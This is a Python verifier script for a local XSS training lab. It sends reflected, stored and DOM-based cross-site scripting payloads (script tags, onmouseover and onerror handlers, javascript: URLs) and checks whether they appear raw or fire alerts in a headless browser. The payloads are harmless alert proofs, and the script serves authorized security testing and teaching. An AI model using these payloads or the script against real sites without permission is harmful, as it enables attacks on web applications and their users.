#!/usr/bin/env python3
"""
Verifier for the local/authorized basic XSS lab cases.

Default target is the companion local lab:
  python3 xss_basic_lab.py --port 8008
  python3 xss_verify_basic.py --base http://127.0.0.1:8008

HTTP checks are dependency-free and verify whether payloads are reflected/stored unsafely.
DOM execution checks need a real browser. Optional:
  python3 -m pip install playwright
  python3 -m playwright install chromium
  python3 xss_verify_basic.py --base http://127.0.0.1:8008 --browser

Only use this against systems you own or have explicit permission to test.
"""
from __future__ import annotations

import argparse
import sys
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Callable, List, Optional, Tuple


@dataclass
class CheckResult:
    name: str
    ok: bool
    evidence: str


def join_url(base: str, path: str, params: Optional[dict[str, str]] = None) -> str:
    url = base.rstrip("/") + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    return url


def get_text(url: str) -> Tuple[int, str]:
    req = urllib.request.Request(url, headers={"User-Agent": "basic-xss-verifier/1.0"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body


def post_form(base: str, path: str, data: dict[str, str]) -> Tuple[int, str]:
    encoded = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(
        base.rstrip("/") + path,
        data=encoded,
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "basic-xss-verifier/1.0"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body


def http_checks(base: str) -> List[CheckResult]:
    results: List[CheckResult] = []

    reflected_html_payload = "<script>alert(1)</script>"
    _, body = get_text(join_url(base, "/reflected-html", {"search": reflected_html_payload}))
    results.append(CheckResult(
        "Reflected XSS into HTML context",
        reflected_html_payload in body,
        "payload appeared raw in response body" if reflected_html_payload in body else "payload was not found raw in response body",
    ))

    reflected_attr_payload = '" onmouseover="alert(1)'
    _, body = get_text(join_url(base, "/reflected-attr", {"search": reflected_attr_payload}))
    results.append(CheckResult(
        "Reflected XSS into an HTML attribute",
        reflected_attr_payload in body,
        "payload appeared raw inside the input value attribute" if reflected_attr_payload in body else "payload was not found raw in the response",
    ))

    stored_html_payload = "<script>alert(1)</script>"
    post_form(base, "/comment", {"comment": stored_html_payload})
    _, body = get_text(join_url(base, "/post"))
    results.append(CheckResult(
        "Stored XSS into HTML context",
        stored_html_payload in body,
        "posted payload appeared raw on the stored-comments page" if stored_html_payload in body else "stored payload was not found raw on the comments page",
    ))

    stored_href_payload = "javascript:alert(1)"
    post_form(base, "/profile", {"website": stored_href_payload})
    _, body = get_text(join_url(base, "/profiles"))
    results.append(CheckResult(
        "Stored XSS into anchor href attribute",
        f'href="{stored_href_payload}"' in body or stored_href_payload in body,
        "stored javascript: URL appeared in an anchor href" if stored_href_payload in body else "stored javascript: URL was not found in the profile page",
    ))

    _, body = get_text(join_url(base, "/dom-document-write"))
    results.append(CheckResult(
        "DOM XSS static check: document.write sink",
        "document.write" in body and "location.search" in body,
        "page source contains user-controlled location.search flowing into document.write" if "document.write" in body else "document.write sink was not found",
    ))

    _, body = get_text(join_url(base, "/dom-innerhtml"))
    results.append(CheckResult(
        "DOM XSS static check: innerHTML sink",
        "innerHTML" in body and "location.search" in body,
        "page source contains user-controlled location.search flowing into innerHTML" if "innerHTML" in body else "innerHTML sink was not found",
    ))

    _, body = get_text(join_url(base, "/dom-href"))
    results.append(CheckResult(
        "DOM XSS static check: href sink",
        ".href" in body and "location.search" in body,
        "page source contains user-controlled location.search flowing into an anchor href" if ".href" in body else "href sink was not found",
    ))

    return results


def browser_alert_check(base: str) -> List[CheckResult]:
    """Run active browser checks if Playwright is installed."""
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError  # type: ignore
    except Exception as exc:  # pragma: no cover - optional dependency
        return [CheckResult("Browser execution checks", False, f"Playwright is not installed or not usable: {exc}")]

    def run_case(page, name: str, action: Callable[[], None]) -> CheckResult:
        dialogs: List[str] = []

        def on_dialog(dialog) -> None:
            dialogs.append(dialog.message)
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            action()
            page.wait_for_timeout(800)
            ok = bool(dialogs)
            return CheckResult(name, ok, f"alert dialog messages: {dialogs}" if ok else "no alert dialog observed")
        except Exception as exc:
            return CheckResult(name, False, f"browser check failed: {exc}")
        finally:
            page.remove_listener("dialog", on_dialog)

    results: List[CheckResult] = []
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        results.append(run_case(
            page,
            "Browser check: reflected HTML alert executes",
            lambda: page.goto(join_url(base, "/reflected-html", {"search": "<script>alert(1)</script>"}), wait_until="domcontentloaded"),
        ))
        results.append(run_case(
            page,
            "Browser check: reflected attribute onmouseover executes",
            lambda: (page.goto(join_url(base, "/reflected-attr", {"search": '" onmouseover="alert(1)'}), wait_until="domcontentloaded"), page.locator('input[name="search"]').hover()),
        ))
        post_form(base, "/comment", {"comment": "<script>alert(1)</script>"})
        results.append(run_case(
            page,
            "Browser check: stored HTML alert executes",
            lambda: page.goto(join_url(base, "/post"), wait_until="domcontentloaded"),
        ))
        post_form(base, "/profile", {"website": "javascript:alert(1)"})
        results.append(run_case(
            page,
            "Browser check: stored href javascript URL executes after click",
            lambda: (page.goto(join_url(base, "/profiles"), wait_until="domcontentloaded"), page.locator("a.website").last.click()),
        ))
        results.append(run_case(
            page,
            "Browser check: DOM document.write payload executes",
            lambda: page.goto(join_url(base, "/dom-document-write", {"search": '"><svg onload=alert(1)>'}), wait_until="domcontentloaded"),
        ))
        results.append(run_case(
            page,
            "Browser check: DOM innerHTML payload executes",
            lambda: page.goto(join_url(base, "/dom-innerhtml", {"search": "<img src=x onerror=alert(1)>"}), wait_until="domcontentloaded"),
        ))
        results.append(run_case(
            page,
            "Browser check: DOM href javascript URL executes after click",
            lambda: (page.goto(join_url(base, "/dom-href", {"returnPath": "javascript:alert(1)"}), wait_until="domcontentloaded"), page.locator("#backLink").click()),
        ))
        browser.close()
    return results


def manual_urls(base: str) -> List[str]:
    return [
        join_url(base, "/reflected-html", {"search": "<script>alert(1)</script>"}),
        join_url(base, "/reflected-attr", {"search": '" onmouseover="alert(1)'}),
        join_url(base, "/dom-document-write", {"search": '"><svg onload=alert(1)>'}),
        join_url(base, "/dom-innerhtml", {"search": "<img src=x onerror=alert(1)>"}),
        join_url(base, "/dom-href", {"returnPath": "javascript:alert(1)"}),
    ]


def print_results(results: List[CheckResult]) -> int:
    failures = 0
    for r in results:
        mark = "PASS" if r.ok else "FAIL"
        if not r.ok:
            failures += 1
        print(f"[{mark}] {r.name}\n       {r.evidence}")
    return failures


def main() -> int:
    parser = argparse.ArgumentParser(description="Verify basic XSS cases against an authorized lab target.")
    parser.add_argument("--base", default="http://127.0.0.1:8008", help="Base URL of the lab/authorized target.")
    parser.add_argument("--browser", action="store_true", help="Also run active browser execution checks with Playwright.")
    args = parser.parse_args()

    if not (args.base.startswith("http://127.0.0.1") or args.base.startswith("http://localhost")):
        print("WARNING: Only run this against systems you own or have explicit authorization to test.", file=sys.stderr)
        time.sleep(1)

    print(f"Target: {args.base.rstrip('/')}")
    print("\nHTTP/static checks")
    failures = print_results(http_checks(args.base))

    if args.browser:
        print("\nBrowser execution checks")
        failures += print_results(browser_alert_check(args.base))
    else:
        print("\nManual browser URLs for alert-based confirmation:")
        for url in manual_urls(args.base):
            print("  " + url)
        print("For DOM/href cases, open the URL in a browser; for href cases, click the rendered link.")

    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
